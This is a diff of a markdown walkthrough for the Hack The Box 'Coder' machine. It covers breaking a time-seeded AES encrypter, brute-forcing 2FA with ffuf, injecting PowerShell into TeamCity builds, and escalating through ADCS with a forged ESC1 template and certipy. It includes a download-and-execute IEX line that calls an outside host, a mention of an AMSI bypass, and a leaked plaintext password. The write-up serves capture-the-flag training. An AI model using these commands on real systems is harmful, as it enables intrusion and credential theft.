@@ -89,7 +89,7 @@ Encrypter.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS 
 
 So we can port this to a Windows VM for analysis via DnSpy. Here, we can see that the file uses AES for something:
 
-<figure><img src="../../.gitbook/assets/image (344).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(344).png>)
 
 We can take a look at the `main` function:
 
@@ -122,7 +122,6 @@ Right, so this uses the **time**. On paper, this is secure, **if they didn't rev
 
 This uses an insecure PRNG generator. With the timestamp as the seed, we can quickly find the correct key and IV needed by just printing it out using some online C# compiler:
 
-{% code overflow="wrap" %}
 ```csharp
 using System;
 using System.IO;
@@ -142,7 +141,6 @@ Console.WriteLine(BitConverter.ToString(array2));
 0E674FD72BA946B290BE0A5E88672402587129B780DB134808C1EDCE0BFEB48C # key
 */
 ```
-{% endcode %}
 
 Then, we can take these values and upload the file to CyberChef to decrypt it and download it as a 7z file. When extracted, we get a `kdbx` file, which is a KeePass database and a `.key` file, presumably for the database.
 
@@ -207,15 +205,15 @@ We can now head to that URL.
 
 We would see a login page, and we already have credentials for it:
 
-<figure><img src="../../.gitbook/assets/image (2848).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(2848).png>)
 
 Then, we would see a 2FA Mechanism in place:
 
-<figure><img src="../../.gitbook/assets/image (1134).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1134).png>)
 
 I wasn't sure how to go about finding this, so I just brute forced it because it doesn't seem to have any account lockout. I used Burp Intruder to do this:
 
-<figure><img src="../../.gitbook/assets/image (1341).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1341).png>)
 
 This works, but is hella slow.
 
@@ -238,7 +236,7 @@ ffuf -request req -w possible_codes -t 70 -fs 89 > output
 
 Then just monitor the output file for any entries that end up inside. This would be the correct code used. This takes around 10-20 minutes, which is a lot faster.
 
-<figure><img src="../../.gitbook/assets/image (2938).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(2938).png>)
 
 Then we can login!
 
@@ -248,7 +246,7 @@ TeamCity is a CI/CD dashboard, and I'm 99% sure we can gain access by building s
 
 When checking the build that we have, we can upload a file here:
 
-<figure><img src="../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(105).png>)
 
 I read more here:
 
@@ -256,22 +254,20 @@ I read more here:
 
 In short, a unified diff file would allow us to append more stuff to the end of the current build, which is obviously not good. Some further enumeration revealed that this uses Powershell.
 
-<figure><img src="../../.gitbook/assets/image (3911).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3911).png>)
 
 The answer is simple. Include some small Powershell code that would execute some commands to download a reverse shell. So I created a quick diff file like this to test:
 
-{% code overflow="wrap" %}
 ```
 --- hello_world.ps1        2023-04-05 04:22:08.640184787 -0400
 +++ hello_world.ps1        2023-04-05 04:21:40.020285109 -0400
 @@ -0,0 +1 @@
 +(New-Object System.Net.WebClient).DownloadString('http://10.10.16.4/downloadmyfiles') | IEX
 ```
-{% endcode %}
 
 Uploading it and running gives me this:
 
-<figure><img src="../../.gitbook/assets/image (2143).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(2143).png>)
 
 Success! I tried to download and run Invoke-PowerShellTcp but it didn't work. Probably is some kind of firewall or security features present on the site. As such, we need to include another Powershell script to bypass it.
 
@@ -291,7 +287,7 @@ Using their `bamsi.txt`, we can bypass the AMSI that is (probably) present on th
 
 Then just upload this file with a basic Powershell reverse shell, and it would work!
 
-<figure><img src="../../.gitbook/assets/image (235).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(235).png>)
 
 ## User Access
 
@@ -312,15 +308,15 @@ Based on this, we just need to head to `C:\TeamCity\logs` and run `type * | Sele
 
 Following the instructions, we would gain access as the administrator of TeamCity rather easily.
 
-<figure><img src="../../.gitbook/assets/image (1802).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1802).png>)
 
 As the administrator, we see some additional stuff like this thing:
 
-<figure><img src="../../.gitbook/assets/image (4047).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(4047).png>)
 
 ADCS? Might need this for later. Anyways as this user, we can add new build steps on the builds. I simply added a new step whereby it would execute the same powershell as above.
 
-<figure><img src="../../.gitbook/assets/image (3382).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3382).png>)
 
 But running just seems to give me a shell as the service user still. But at least the shell never times out unless I want it to.
 
@@ -328,7 +324,6 @@ But running just seems to give me a shell as the service user still. But at leas
 
 Reading online tells me that there's a Data Directory present within TeamCity, and we can view that through Administration > Global Settings. Because we upload `.diff` files, there is likely a folder that stores all the changes made. We can find the file here:
 
-{% code overflow="wrap" %}
 ```
 PS C:\ProgramData\JetBrains\TeamCity\system\changes> type 101.changes.diff
 <TRUNCATED>
@@ -390,7 +385,6 @@ index 0000000..a6285ed
 +20
 +122
 ```
-{% endcode %}
 
 This is a Powershell Secure String encoding using a key. We can decode this here if you're lazy after some formatting:
 
@@ -400,7 +394,7 @@ Decrypting this would give us the user's credentials as remote Powershell was be
 
 This would decrypt to give `ypOSJXPqlDOxxbQSfEERy300`, which we can easily use to `evil-winrm` in as the user and capture the user flag.
 
-<figure><img src="../../.gitbook/assets/image (1504).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1504).png>)
 
 ## AD Privilege Escalation
 
@@ -425,7 +419,7 @@ The first thing we need to do is to enumerate all possible certificates to find 
 
 Unfortunately, there won't be any vulnerable templates that we can exploit because none of the templates present give us any enrollment permissions. Since the user is part of PKI Admins, we can take a closer look at the role and infer what permissions we have. I used Bloodhound to map the permissions, and didn't find much apart from this:
 
-<figure><img src="../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(138).png>)
 
 So `e.black` can manage templates for the ADCS instance. Since we could not find any templates to abuse, perhaps we can **add one.** We just need to find a template for a certificate, add it and give PKI Admins enrollment rights to abuse this and request an administrator TGT.
 
@@ -439,14 +433,12 @@ Next, we need to find a JSON certificate template. Since we are adding a new cer
 
 Download the Powershell and JSON files to the machine and perform the following:
 
-{% code overflow="wrap" %}
 ```powershell
 Import-Module .\ADCSTemplate.psm1
 Export-Template -DisplayName ESC1 > .\default.json
 Get-Content -Path "C:\Users\e.black\esc1.json" | Set-Content -Path "C:\Users\e.black\default.json"
 New-ADCSTemplate -DisplayName ESC1 -JSON (Get-Content .\default.json -Raw) -Publish -Identity "CODER\PKI Admins"
 ```
-{% endcode %}
 
 What these commands do is:
 
@@ -455,18 +447,16 @@ What these commands do is:
 
 Afterwards, we can run `certipy` to get a PFX file for the administrator. Keep in mind to do these steps fast because there's a scheduled task resetting the certificates.
 
-{% code overflow="wrap" %}
 ```bash
 certipy req -username e.black@coder.htb -password <pass> -ca coder-DC01-CA -target dc01.coder.htb -template esc1 -dc-ip <ip> -upn administrator@coder.htb
 ```
-{% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (2976).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(2976).png>)
 
 This would retrieve the administrator PFX for us to use. We can then use this to retrieve the NT Hash for the administrator and login using `evil-winrm`:
 
-<figure><img src="../../.gitbook/assets/image (2196).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(2196).png>)
 
-<figure><img src="../../.gitbook/assets/image (513).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(513).png>)
 
 Rooted!
